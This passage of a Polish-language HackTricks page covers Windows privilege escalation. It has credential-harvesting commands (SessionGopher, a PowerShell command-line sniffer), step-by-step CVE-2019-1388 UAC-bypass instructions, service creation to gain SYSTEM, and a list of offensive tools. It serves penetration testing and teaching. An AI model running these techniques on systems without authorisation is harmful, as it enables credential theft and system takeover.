[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wydobywania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** w kilku narzędziach, które przechowują te dane w postaci zwykłego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP).
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Wycieki Uchwytów

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy również nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, ale dziedzicząc wszystkie otwarte uchwyty głównego procesu**.\
Następnie, jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przechwycić **otwarty uchwyt do utworzonego procesu o uprzywilejowanych uprawnieniach** za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Czytaj ten przykład, aby uzyskać więcej informacji na temat **jak wykryć i wykorzystać tę podatność**.](leaked-handle-exploitation.md)\
[Czytaj ten **inny post, aby uzyskać bardziej kompletną wyjaśnienie, jak testować i nadużywać więcej otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonacja Klienta Named Pipe

Segmenty pamięci współdzielone, zwane **rurami**, umożliwiają komunikację między procesami i transfer danych.

Windows udostępnia funkcję o nazwie **Named Pipes**, pozwalającą niepowiązanym procesom na współdzielenie danych, nawet w różnych sieciach. Przypomina to architekturę klient/serwer, zdefiniowaną rolami **serwera rury nazwanej** i **klienta rury nazwanej**.

Gdy dane są wysyłane przez **klienta** przez rurę, **serwer**, który skonfigurował rurę, ma możliwość **przyjęcia tożsamości** **klienta**, zakładając, że ma odpowiednie uprawnienia **SeImpersonate**. Zidentyfikowanie **uprzywilejowanego procesu**, który komunikuje się za pomocą rury, którą możesz naśladować, daje możliwość **uzyskania wyższych uprawnień** poprzez przyjęcie tożsamości tego procesu, gdy nawiąże interakcję z rurą, którą ustanowiłeś. Instrukcje dotyczące przeprowadzenia takiego ataku można znaleźć [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](./#from-high-integrity-to-system).

Ponadto, następujące narzędzie pozwala na **przechwytywanie komunikacji rury nazwanej za pomocą narzędzia takiego jak burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a to narzędzie pozwala na wyświetlenie i zobaczenie wszystkich rur, aby znaleźć podniesione uprawnienia** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Różne

### **Monitorowanie poleceń w celu przechwytywania haseł**

Podczas uzyskiwania powłoki jako użytkownik, mogą być wykonywane zaplanowane zadania lub inne procesy, które **przekazują dane uwierzytelniające w wierszu poleceń**. Poniższy skrypt przechwytuje wiersze poleceń procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wypisując wszelkie różnice.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kradzież haseł z procesów

## Od użytkownika o niskich uprawnieniach do SYSTEM NT\AUTHORITY (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (za pośrednictwem konsoli lub RDP) i UAC jest włączone, w niektórych wersjach systemu Microsoft Windows możliwe jest uruchomienie terminala lub innego procesu, takiego jak "NT\AUTHORITY SYSTEM" z konta o niskich uprawnieniach.

Dzięki temu istnieje możliwość eskalacji uprawnień i jednoczesnego obejścia UAC przy użyciu tej samej podatności. Dodatkowo nie ma potrzeby instalowania czegokolwiek, a binarny plik używany podczas procesu jest podpisany i wydany przez firmę Microsoft.

Niektóre z dotkniętych systemów to:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Aby wykorzystać tę podatność, konieczne jest wykonanie następujących kroków:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Masz wszystkie niezbędne pliki i informacje w następującym repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388

## Z poziomu Administratora do wysokiego poziomu integralności / UAC Bypass

Przeczytaj to, aby dowiedzieć się więcej o **Poziomach Integralności**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Następnie **przeczytaj to, aby dowiedzieć się o UAC i bypassach UAC:**

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **Z wysokiego poziomu integralności do Systemu**

### **Nowa usługa**

Jeśli już działasz w procesie o wysokim poziomie integralności, **przejście do SYSTEMu** może być proste poprzez **utworzenie i wykonanie nowej usługi**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Z procesu o wysokiej integralności możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** odwrócony shell, używając opakowania _**.msi**_.\
[Więcej informacji o zaangażowanych kluczach rejestru i jak zainstalować pakiet _.msi_ znajdziesz tutaj.](./#alwaysinstallelevated)

### Uprawnienia High + SeImpersonate do Systemu

**Możesz** [**znaleźć kod tutaj**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do pełnych uprawnień tokena

Jeśli masz te uprawnienia tokena (prawdopodobnie znajdziesz je w procesie o wysokiej integralności), będziesz mógł **otworzyć prawie każdy proces** (oprocz chronionych procesów) z uprawnieniem SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Korzystając z tej techniki, zazwyczaj **wybierany jest dowolny proces uruchomiony jako SYSTEM z wszystkimi uprawnieniami tokena** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich uprawnień tokena_).\
**Możesz znaleźć** [**przykład kodu wykonującego proponowaną technikę tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Nazwane potoki**

Ta technika jest używana przez meterpreter do eskalacji w `getsystem`. Technika polega na **utworzeniu potoku, a następnie utworzeniu/wykorzystaniu usługi do zapisania w tym potoku**. Następnie **serwer**, który utworzył potok przy użyciu uprawnienia **`SeImpersonate`**, będzie mógł **podrobić token** klienta potoku (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o nazwanych potokach, powinieneś przeczytać to**](./#named-pipe-client-impersonation).\
Jeśli chcesz przeczytać przykład [**jak przejść z wysokiej integralności do Systemu, używając nazwanych potoków, powinieneś przeczytać to**](from-high-integrity-to-system-with-name-pipes.md).

### Przechwytywanie Dll

Jeśli uda ci się **przechwycić dll**, które jest **ładowane** przez **proces** uruchomiony jako **SYSTEM**, będziesz mógł wykonać dowolny kod z tymi uprawnieniami. Dlatego przechwytywanie Dll jest również przydatne do tego rodzaju eskalacji uprawnień, a ponadto, jest znacznie **łatwiejsze do osiągnięcia z procesu o wysokiej integralności**, ponieważ będzie miał **uprawnienia do zapisu** w folderach używanych do ładowania dll.\
**Możesz** [**dowiedzieć się więcej o przechwytywaniu Dll tutaj**](dll-hijacking/)**.**

### **Od Administratora lub Usługi sieciowej do Systemu**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Od USŁUGI LOKALNEJ lub USŁUGI SIECIOWEJ do pełnych uprawnień

**Czytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Statyczne binaria impacket](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do szukania wektorów eskalacji uprawnień lokalnych w systemie Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sprawdź konfiguracje i pliki poufne (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykryto.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sprawdź możliwe konfiguracje i zbieraj informacje (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sprawdź konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wydobywa informacje o sesjach zapisanych w PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj -Thorough lokalnie.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wydobywa dane uwierzytelniające z Menedżera poświadczeń. Wykryto.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Rozpyla zebrane hasła w całej domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do podszywania się pod ADIDNS/LLMNR/mDNS/NBNS i ataku typu man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa enumeracja Windows w celu eskalacji uprawnień**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Szukaj znanych podatności eskalacji uprawnień (NIEAKTUALNE dla Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne sprawdzenia **(Wymaga uprawnień administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Szukaj znanych podatności eskalacji uprawnień (należy go skompilować za pomocą VisualStudio) ([**prekompilowane**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Wylicza hosta w poszukiwaniu konfiguracji (bardziej narzędzie do zbierania informacji niż eskalacji uprawnień) (należy go skompilować) **(**[**prekompilowane**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wydobywa dane uwierzytelniające z wielu programów (prekompilowany exe na github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Sprawdź konfigurację (wykonywalny plik prekompilowany na github). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Sprawdź możliwe konfiguracje (exe z pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie stworzone na podstawie tego posta (nie wymaga accesschk do poprawnego działania, ale może go używać).

**Lokalne**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploit'y (lokalny python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik **systeminfo** i rekomenduje działające exploit'y (lokalny python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Musisz skompilować projekt przy użyciu odpowiedniej wersji .NET ([zobacz to](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby zobaczyć zainstalowaną wersję .NET na hoście ofiary, możesz to zrobić:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Bibliografia

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie z branży cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
